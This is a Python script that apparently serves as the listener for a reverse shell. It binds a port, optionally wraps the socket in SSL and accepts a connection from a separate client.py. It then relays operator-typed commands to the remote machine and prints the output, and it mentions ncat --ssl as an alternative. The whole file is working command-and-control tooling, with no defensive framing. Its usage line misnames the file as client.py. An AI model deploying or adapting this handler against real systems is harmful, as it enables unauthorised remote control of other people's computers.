import socket
import sys
import argparse
import ssl
import time


"""
Handler for client.py in Python 3. 
Make sure to run certs.sh before using this script
If you're unable to run certs.sh, ncat --ssl works just as well.
USAGE: python3 client.py --ssl 127.0.0.1 4444
"""


def get_args():
    """Define host, port, and encryption variables"""

    parser = argparse.ArgumentParser(description="Python tcp server")
    parser.add_argument("host", help="IP address to bind for listening")
    parser.add_argument("port", help="Port to bind for listening", type=int)
    parser.add_argument("--ssl", help="Enable SSL encryption", action="store_true")

    # Array of parsed arguments
    args = parser.parse_args()
    host = args.host
    port = args.port
    enc = args.ssl
    return host, port, enc



def wrap_sock(enc=False):
    """Create and wrap socket"""

    try:
        s = socket.socket(2, 1)
        if enc == True:
            print("SSL encryption enabled")
            s = ssl.wrap_socket(s, server_side=True, certfile="server.crt", keyfile="server.key")
        return s
    except socket.error as msg:
        print("Socket creation error: {}".format(str(msg)))
        sys.exit()




def bind_sock(s, host, port):
    """Bind socket to port and wait for client to connect. Avoid recursion with a while loop."""

    max = 10
    attempts = 0
    while attempts < max:
        try:
            print("Binding port: " + str(port))
            s.bind((host, port))
            print("Listening for client...")
            s.listen(5)
            return s
        except socket.error as msg:
            print("Error binding socket: {}\n  Retrying...".format(str(msg)))
            time.sleep(3)
            attempts += 1
    s.close()
    sys.exit()


def handle(s):
    """Handle connection to client"""

    conn, address = s.accept()
    print("Connection established from: {} {}".format(address[0], str(address[1])))
    send_commands(conn)
    conn.close()
    s.close()



def send_commands(conn):
    """Server loop to send commands until exit"""

    try:
        while True:
            cmd = input()
            if cmd == 'exit':
                conn.send(str.encode("kill"))
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")

    except KeyboardInterrupt:
        # Pass because once we break out of the loop, we go back up to handle and conn.close, s.close
        pass




def main():

    host, port, enc = get_args()

    s = bind_sock(wrap_sock(enc), host, port)

    handle(s)


if __name__ == "__main__":
    main()
